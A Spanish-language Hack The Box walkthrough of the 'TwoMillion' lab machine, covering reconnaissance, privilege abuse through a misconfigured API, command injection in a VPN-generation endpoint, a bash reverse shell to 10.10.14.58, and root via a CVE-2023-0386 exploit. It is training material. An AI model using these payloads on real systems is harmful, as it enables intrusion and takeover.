---
description: >-
  ✍️ Autor: TRX & TheCyberGeek 🔍 Dificultad: Fácil 📅 Fecha de creación:
  7/06/2023
---

# TwoMillion

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.11.221
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.11.221
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)   (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 10.10.11.221
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (3).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se asimila a la página oficial de Hack The Box pero no vemos nada interesante por lo que revisamos los directorios.

```bash
gobuster dir -u http://2million.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --exclude-length 162
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención el directorio `/invite` se asimila a como se tenía que registrar la gente al principio en la plataforma ya que se necesitaba un código de invitación. Tras inspeccionar la página encontramos la función llamada **makeInviteCode**.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

La llamamos.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como vemos esta encriptada en **ROT13** por lo que desencriptamos.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Realizamos lo que nos comunica la pista.

```bash
curl -s -X POST "http://2million.htb/api/v1/invite/generate"
```

<figure><img src="../../.gitbook/assets/image (19) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Está el código en **base64** por lo que decodificamos.

```bash
echo "SDg2RjUtUUdRMDUtWEdEMTItU1o3QTg=" | base64 -d
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (10).png" alt=""><figcaption></figcaption></figure>

Ponemos el código de invitación.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-12 125945.png" alt=""><figcaption></figcaption></figure>

Nos logueamos con las credenciales registradas.

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vamos al apartado de **Access**. Miramos los endpoints de la API.

```bash
curl -s -X GET "http://2million.htb/api/v1" -v
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos sale **Unauthorized** por lo que tenemos que coger la **cookie session**.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
curl -s -X GET "http://2million.htb/api/v1" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" | jq
```

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

No somos administradores. Tampoco podemos generar una VPN. Vemos que podemos actualizar datos del usuario así que probamos.

```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" -H "Content-Type: application/json"| jq
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos avisa del email por lo que añadimos.

```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" -H "Content-Type: application/json" -d '{"email":"bea@gmail.com"}'| jq
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos dice que falta un parámetro por si es administrador.

```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" -H "Content-Type: application/json" -d '{"email":"bea@gmail.com", "is_admin":1}'| jq
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Somos administradores lo que significa que la API está mal configurada. Por si acaso revisamos.

```bash
curl -s -X GET "http://2million.htb/api/v1/admin/auth" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" | jq
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Intentamos generar una VPN ya que somos admin.

```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" | jq
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Matizamos lo que se nos avisa.

```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" -H "Content-Type: application/json"| jq
```

<figure><img src="../../.gitbook/assets/image (22) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora nos pide el parámetro username.

```
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" -H "Content-Type: application/json" -d '{"username":"beafn28"}'| jq
```

<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

La respuesta ya no está en JSON por lo que lo quitamos.

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Genera una VPN por el usuario que le diga. Por lo que hacemos lo siguiente.

```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" -H "Content-Type: application/json" -d '{"username":"prueba; whoami;"}'
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Somos www-data por lo que tenemos RCE.

```
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" -H "Content-Type: application/json" -d '{"username": "prueba; bash -c \"bash -i >& /dev/tcp/10.10.14.58/443 0>&1\";"}'
```

Nos conectamos.

```bash
nc -lnvp 443
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tenemos un fichero .env interesante mostramos su contenido.

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Migramos de usuario.

```bash
ssh admin@2million.htb
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar pero nos pide contraseña. Tampoco tenemos permisos SUID.&#x20;

Nos dice que tenemos un mail.

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al ver la información del sistema en el que nos encontramos encontramos este exploit.

{% @github-files/github-code-block url="https://github.com/sxlmnwb/CVE-2023-0386" %}

Nos lo descargamos en nuestra máquina víctima tras comprimirlo en nuestra máquina anfitrión.

```bash
wget http://10.10.14.58/comprimido.zip
```

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Abrimos otra terminal y nos logueamos a través de **ssh** y también nos situamos en el directorio `/tmp/CVE-2023-0386`.

```
PRIMERA TERMINAL
make all
./fuse ./ovlcap/lower ./gc

SEGUNDA TERMINAL
./exp
```

Tras realizar esto nos convertimos en **root**.

<figure><img src="../../.gitbook/assets/image (1166).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1165).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-12 153509.png" alt=""><figcaption></figcaption></figure>
